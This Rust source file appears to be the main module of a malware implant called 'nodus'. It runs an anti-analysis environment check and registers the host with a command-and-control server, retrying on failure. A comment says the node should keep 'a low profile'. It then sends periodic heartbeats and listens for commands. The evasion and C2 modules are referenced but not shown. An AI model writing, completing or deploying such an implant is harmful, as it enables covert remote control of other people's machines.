mod anti_analysis;
mod c2com;
mod identity;

use std::{ops::Deref, sync::Arc};

use tokio::{
    signal,
    sync::{Mutex, mpsc},
    time::{Duration, interval, sleep},
};
use tokio_util::sync::CancellationToken;

use crate::{c2com::C2Com, identity::Identity};

enum Command {
    Heartbeat,
    Shutdown,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("nodus starting...");
    anti_analysis::check_environment();

    let identity = identity::init();
    let mut c2com = c2com::init();
    register_self(&mut c2com, &identity).await;

    let (tx, rx) = mpsc::channel::<Command>(32);
    let worker_thread = tokio::spawn(worker_loop(c2com, identity, rx));

    let mut heartbeat_tick = interval(Duration::from_secs(5));
    loop {
        tokio::select! {
            _ = signal::ctrl_c() => {
                println!("shutting down...");
                let _ = tx.send(Command::Shutdown).await;
                let _ = worker_thread.await;
                return Ok(());
            }
            _ = heartbeat_tick.tick() => {
                let _ = tx.send(Command::Heartbeat).await;
            }
        }
    }
}

async fn register_self(c2com: &mut C2Com, identity: &Identity) {
    println!("+--- attempting registration ---+");

    let mut registration_attempts = 0u8;
    loop {
        // technically the node should forever try to register itself while keeping a low profile.
        // but it could be an option to make a node die if it struggles too much.
        if registration_attempts >= 5 {
            eprintln!(" - registration completely failed. exiting...");
            std::process::exit(0);
        }

        match c2com::payloads::registration(identity) {
            Ok(payload) => match c2com.ask(&payload).await {
                Ok(response) => {
                    if let Some(resp_data) = response
                        && resp_data == b"ACK"
                    {
                        println!(" - registration succeeded.");
                        break;
                    }

                    println!(" - improper response from c2 during registration.");
                }
                Err(err) => {
                    println!(" - registration failed. {err}");
                }
            },
            Err(err) => {
                println!(" - registration payload build failed. {err}");
            }
        }

        registration_attempts += 1;
        sleep(Duration::from_secs(5)).await; // maybe make it a random delay each iteration.
    }
}

async fn worker_loop(
    mut c2com: C2Com,
    identity: Identity,
    mut rx: mpsc::Receiver<Command>,
) {
    loop {
        tokio::select! {
            cmd = rx.recv() => match cmd {
                Some(Command::Heartbeat) => {
                    c2com.heartbeat(&identity).await;
                }
                Some(Command::Shutdown) | None => {
                    break;
                }
            },

            listen_result = c2com.listen(0) => match listen_result {
                Ok(Some(data)) => {
                    println!("received data: {:?}", data);
                },
                Ok(None) => {}
                Err(err) => {
                    eprintln!(" - listen failed. {err}");
                }
            }
        }
    }
}
